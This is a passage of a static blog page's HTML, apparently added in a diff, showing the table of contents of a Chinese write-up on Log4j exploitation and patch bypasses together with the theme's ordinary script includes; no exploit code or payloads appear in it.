class="nav-text">其他利用</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#sys%EF%BC%8Cenv%EF%BC%8Cjava%E7%AD%89%E5%8D%8F%E8%AE%AE"><span class="nav-number">5.1.</span> <span class="nav-text">sys，env，java等协议</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#bundle%E5%8D%8F%E8%AE%AE"><span class="nav-number">5.2.</span> <span class="nav-text">bundle协议</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%B8%8D%E5%87%BA%E7%BD%91%E5%9B%9E%E6%98%BE"><span class="nav-number">5.3.</span> <span class="nav-text">不出网回显</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E8%A1%A5%E4%B8%81%E4%BF%AE%E5%A4%8D-%E7%BB%95%E8%BF%87"><span class="nav-number">6.</span> <span class="nav-text">补丁修复&amp;绕过</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#2-15-0-rc1"><span class="nav-number">6.1.</span> <span class="nav-text">2.15.0-rc1</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#2-15-0-rc2%E4%BF%AE%E5%A4%8D"><span class="nav-number">6.2.</span> <span class="nav-text">2.15.0-rc2修复</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#jdk17%E5%88%A9%E7%94%A8"><span class="nav-number">7.</span> <span class="nav-text">jdk17利用</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E4%B8%BA%E4%BB%80%E4%B9%88%E8%A7%A6%E5%8F%91%E4%BA%86%E5%A4%9A%E6%AC%A1"><span class="nav-number">8.</span> <span class="nav-text">为什么触发了多次</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%B7%A5%E5%85%B7%E5%88%A9%E7%94%A8"><span class="nav-number">9.</span> <span class="nav-text">工具利用</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E6%80%BB%E7%BB%93"><span class="nav-number">10.</span> <span class="nav-text">总结</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%8F%82%E8%80%83"><span class="nav-number">11.</span> <span class="nav-text">参考</span></a></li></ol>
+    </div>
+</div>
+
+            </div>
+        </div>
+    
+</main>
+
+
+
+
+
+<!-- common js -->
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/header-shrink.js"></script>
+
+<script src="/js/back2top.js"></script>
+
+<script src="/js/toggle-theme.js"></script>
+
+<script src="/js/code-block.js"></script>
+
+<script src="/js/main.js"></script>
+
+<script src="/js/libs/anime.min.js"></script>
+
+
+<!-- local search -->
+
+    
+<script src="/js/local-search.js"></script>
+
+
+
+<!-- lazyload -->
+
+
+<div class="pjax">
+    <!-- home page -->
+    
+
+    <!-- post page -->
+    
+        <!-- post-helper -->
+        
+<script src="/js/post/post-helper.js"></script>
+
+
+        <!-- toc -->
+        
+            
+<script src="/js/post/toc.js"></script>
+
+        
+
+        <!-- copyright-info -->
+        
+            
+<script src="/js/post/copyright-info.js"></script>
+
+        
+
+        <!-- share -->
+        
+    
+
+    <!-- categories page -->
+    
+
+    <!-- links page -->
+    
+
+    <!-- photos page -->
+    
+
+    <!-- tools page -->
+    
+</div>
+
+<!-- mermaid -->
+
+
+<!-- pjax -->
+
+    
+<script src="/js/libs/pjax.min.js"></script>
+
+<script>
+    window.addEventListener('DOMContentLoaded', () => {
+        window.pjax = new Pjax({
+            selectors: [
+                'head title',
+                '.page-container',
+                '.pjax'
+            ],
+            history: true,
+            debug: false,
+            cacheBust: false,
+            timeout: 0,
+            analytics: false,
+            currentUrlFullReload: false,
+            scrollRestoration: false,
+        });
+
+        document.addEventListener('pjax:send', () => {
+            KEEP.utils.pjaxProgressBarStart()
+        });
+
+        document.addEventListener('pjax:complete', () => {
+            KEEP.utils.pjaxProgressBarEnd()
+            window.pjax.executeScripts(document.querySelectorAll('script[data-pjax], .pjax script'))
+            KEEP.initExecute()
+        });
+    });
+</script>
+
+
+
+
+</body>
+</html>
